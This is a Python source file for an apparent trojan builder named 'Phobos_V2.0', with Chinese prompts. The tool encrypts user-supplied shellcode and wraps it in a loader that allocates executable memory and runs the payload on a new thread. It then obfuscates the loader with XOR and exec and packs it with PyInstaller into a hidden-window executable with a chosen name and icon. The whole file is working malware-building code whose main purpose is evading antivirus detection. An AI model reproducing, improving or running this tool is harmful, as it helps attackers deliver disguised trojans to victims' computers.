from Crypto.IO import PEM
import os
import random
import string
import ctypes
import shutil
import time

def shellcode_encrypt(buffer,passwd):
	buffer = bytes(buffer.encode())
	passwd = bytes(passwd.encode())
	pem_buf = PEM.encode(buffer, marker=None, passphrase=passwd, randfunc=None)
	pem_buf = "\"\"\"" + pem_buf + "\"\"\""
	return pem_buf

def load_end(codepem,passwd):
	passwd = "\"" + passwd + "\""
	loader = "s = %s ;p = %s ;pw = bytes(p.encode());s = PEM.decode(s, passphrase=pw)[0];s = s.decode('unicode-escape').encode('ISO-8859-1');s = bytearray(s);ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64;p = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(s)),ctypes.c_int(0x3000),ctypes.c_int(0x40));b = (ctypes.c_char * len(s)).from_buffer(s);ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(p),b,ctypes.c_int(len(s)));h = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(p),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)));ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(h),ctypes.c_int(-1));" % (codepem,passwd)
	return loader

def xorEncode(loader,key):
	load_list = list(loader)
	en_load = []
	for i in load_list:
		code = ord(i) ^ key
		en_load.append(code)
	return en_load;

def build_end(en_load,key):
	loader = "from Crypto.IO import PEM;import ctypes;l = " + str(en_load)
	deco = ";de = [chr(i ^ %s) for i in l];l = list(map(str,de));l = ''.join(de);exec(l)" % int(key)
	build = loader + deco
	builder = open('tmp\\b.py','w')
	builder.write(str(build))
	builder.close()

def exe_build(name,icon):
	key = ''.join(random.sample(string.ascii_letters + string.digits, 32))
	if (name != None and icon != None):
		os.popen('pyinstaller -F -w -n %s --key %s -i %s tmp\\b.py' % (name,key,icon))
	elif (name == None and icon != None):
		name = ''.join(random.sample(string.ascii_letters + string.digits, 5))
		os.popen('pyinstaller -F -w -n %s --key %s -i %s tmp\\b.py' % (name,key,icon))
	elif (name != None and icon == None):
		os.popen('pyinstaller -F -w -n %s --key %s tmp\\b.py' % (name,key))
	elif (name == None and icon == None):
		name = ''.join(random.sample(string.ascii_letters + string.digits, 5))
		os.popen('pyinstaller -F -w -n %s --key %s tmp\\b.py' % (name,key))
	else:
		print("\n输入信息有错误！\n")
	print("\n木马正在加密生成中......\n")
	time.sleep(30)
	return name

if __name__== "__main__":

	print("""

              #################        # #   
              #################       # #      
                            ##      # #     
                          ##      # #     
                        ##     # #        
                      ##    # #        
                    ##   # #           
                  ##     # #                       
                ##          # #              
              ##              # #           
            ##                  # #       
            #################     # #
            #################      # #        Phobos_V2.0  
            
            Github地址：https://github.com/ZackSecurity/Phobos

		""")

	if os.path.exists('tmp'):
		pass
	else:
		os.mkdir('tmp')

	buffer = input("请输入Shellcode：")
	passwd = ''.join(random.sample(string.ascii_letters + string.digits, 32))
	shellcode_encrypt = shellcode_encrypt(buffer,passwd)
	print("加密shellcode完成。")

	loader = load_end(shellcode_encrypt,passwd)
	key = random.randint(1,255)
	en_load = xorEncode(loader,key)
	print("加密loader完成。")
	build_end(en_load,key)
	print("生成投递器完成。")

	name = input("请设置生成木马名称(默认随机)：")
	if len(name) == 0:
		name = None
	icon = input("请输入木马图标路径(默认py图标)：")
	if len(icon) == 0:
		icon = None
	name = exe_build(name,icon)

	if os.path.exists("dist\\" + name + ".exe"):
		print("\n木马生成完成，请查看dist文件夹。\n")
	else:
		print("\n木马生成失败，请检查是否输入有误！\n")
	if os.path.exists("tmp"):
		shutil.rmtree("tmp")
	if os.path.exists("build"):
		shutil.rmtree("build")
	if os.path.exists(name + ".spec"):
		os.remove(name + ".spec")
	os.system("pause")